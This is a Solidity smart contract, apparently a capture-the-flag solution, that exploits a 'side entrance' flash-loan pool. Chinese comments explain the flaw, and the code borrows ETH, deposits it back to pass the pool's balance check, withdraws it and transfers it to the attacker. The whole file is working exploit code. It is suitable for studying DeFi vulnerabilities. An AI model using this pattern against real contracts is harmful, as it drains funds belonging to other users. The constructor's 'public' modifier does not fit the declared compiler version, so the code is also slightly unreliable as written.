// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntrancePool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title SideEntranceAttack
 * @notice 利用 deposit() 代替 repay 绕过闪电贷检查
 * 
 * 漏洞：flashLoan 检查余额但 deposit() 也能存入资金
 * 攻击：借 ETH → 不走 repay，而是 deposit() 存回去 → 余额检查通过 → withdraw() 取走
 */
contract SideEntranceAttack {
    ISideEntrancePool pool;
    address attacker;
    
    constructor(address _pool) public {
        pool = ISideEntrancePool(_pool);
        attacker = msg.sender;
    }
    
    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }
    
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
    
    receive() external payable {}
}
